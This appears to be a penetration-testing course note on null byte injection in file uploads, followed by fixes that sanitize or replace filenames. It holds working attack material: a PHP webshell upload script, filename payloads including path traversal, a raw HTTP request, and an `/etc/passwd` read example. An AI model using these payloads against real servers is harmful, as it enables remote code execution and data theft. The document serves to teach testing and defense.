---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.06 Null Byte Injection (file.php%00.jpg)"
---

# 22.06 — Null Byte Injection (file.php%00.jpg)

## What is it?
In many programming languages that rely on underlying C or C++ libraries (like older versions of PHP, Perl, or Ruby), strings are "null-terminated." This means that the language expects a string to end when it encounters a Null Byte character (`\x00` in hex, or `%00` URL encoded).

If an application validates the extension of an uploaded file using a high-level string function, but then passes that filename to a lower-level C function to save the file to the operating system, a mismatch occurs. By injecting a null byte, an attacker can trick the validation logic into seeing a safe extension (e.g., `.jpg`), while the operating system truncates the filename early, dropping the fake extension and saving the file with a dangerous extension (e.g., `.php`).

Think of it like handing a bouncer an ID card that says "John Doe (VIP)". The bouncer checks the "(VIP)" part and lets you in. However, the computer system inside the club only reads up to the first space, logging you in simply as "John", who happens to have admin rights. 

## ASCII Diagram
```text
[Attacker] 
   │ 
   │ 1. Uploads file with name: shell.php%00.jpg
   ▼
[Web Application (Validation Layer)]
   │
   │ 2. Checks filename: "shell.php\x00.jpg"
   │ 3. Ends with ".jpg"? YES! (Validation Passes)
   ▼
[Operating System (C-Level File Saving)]
   │
   │ 4. Receives string: "shell.php\x00.jpg"
   │ 5. Reads "shell.php"
   │ 6. Hits \x00 (Null Byte) -> Stops reading string
   ▼
[File System] ─── 7. Saves file exactly as: shell.php
```

## How to Find It
- **Manual steps:**
  1. Intercept a file upload request using Burp Suite.
  2. Modify the `filename` parameter in the `Content-Disposition` header to include a null byte (e.g., `filename="test.php%00.jpg"`).
  3. Note: In `multipart/form-data`, you often need to URL decode the `%00` into an actual null byte, or use Burp's Hex Editor to manually change the bytes.
  4. Submit the request and observe the server's response.
  5. Attempt to access the file without the `.jpg` extension (`https://target.com/uploads/test.php`). If it executes, the system is vulnerable.

- **Tool commands with flags explained:**
  Using Python to programmatically send a raw null byte in the multipart form:
  ```bash
  python3 -c "
  import requests
  # Send an actual \x00 byte in the filename
  files = {'file': ('shell.php\x00.jpg', '<?php system(\$_GET[\'cmd\']); ?>', 'image/jpeg')}
  requests.post('https://target.com/upload', files=files)
  "
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Identify an upload endpoint that restricts files based on extension.
  2. Prepare a PHP webshell payload.
  3. Send the upload request, changing the filename to `shell.php%00.jpg` (or inserting a raw hex `00` before the `.jpg` if using Burp Repeater).
  4. The application logic sees `.jpg` and allows the file.
  5. The backend file system truncates the name and saves it as `shell.php`.
  6. Navigate to the uploaded `shell.php` to achieve Remote Code Execution (RCE).

- **Actual payloads:**
  **Basic Null Byte Injection:**
  ```text
  filename="shell.php%00.jpg"
  ```
  **Double Extension + Null Byte:**
  ```text
  filename="shell.php.jpg%00.png"
  ```
  **Null Byte in Path Traversal:**
  ```text
  filename="../../../var/www/html/shell.php%00.jpg"
  ```

- **Real HTTP request/response examples:**
  **Upload Request (Intercepted in Burp):**
  ```http
  POST /upload.php HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
  Content-Type: image/jpeg

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  *(Note: You must highlight `%00` in Burp and press Ctrl+Shift+U to URL decode it to an actual null byte before sending).*

## Real-World Example
Null byte injections were notoriously common in PHP applications running on versions older than PHP 5.3.4. Many custom CMS platforms and image gallery scripts would validate that an uploaded file ended in `.gif` or `.jpg`. Attackers successfully compromised millions of these servers by uploading `backdoor.php\x00.gif`. Because the developers relied on PHP's `strrchr()` to find the extension, it returned `.gif`, but when `move_uploaded_file()` was called, the underlying C function truncated the file to `backdoor.php`.

## How to Fix It
- **Developer remediation:**
  Modern frameworks and language versions (like PHP > 5.3.4) have patched this vulnerability by ensuring high-level file functions do not truncate at null bytes. The best defense is ensuring your language environment is up-to-date. Furthermore, you should proactively sanitize filenames by stripping out null bytes entirely, or better yet, discard the user's filename completely and generate a new random string for the filename.

- **Code snippet:**
  **PHP (Sanitizing explicitly):**
  ```php
  // Strip null bytes from the filename explicitly
  $filename = str_replace(chr(0), '', $_FILES['file']['name']);
  ```
  
  **Python (Generating a new filename):**
  ```python
  import uuid
  
  # Discard the user's input filename entirely
  # User cannot inject a null byte if you don't use their filename
  safe_filename = str(uuid.uuid4()) + '.jpg'
  ```

## Chaining Opportunities
- This vuln + [[07 - File Upload + Path Traversal]] → Attackers often use null bytes to terminate path traversal payloads when the backend appends a mandatory extension. Example: `../../../../etc/passwd%00` truncates an appended `.jpg` in legacy file-read functions.
- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → Combine a null byte filename (`shell.php%00.jpg`) with valid JPEG Magic Bytes in the file body (`FF D8 FF E0`) to bypass both extension filters and MIME/content validation simultaneously.

## Related Notes
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[05 - Double Extension (file.php.jpg)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
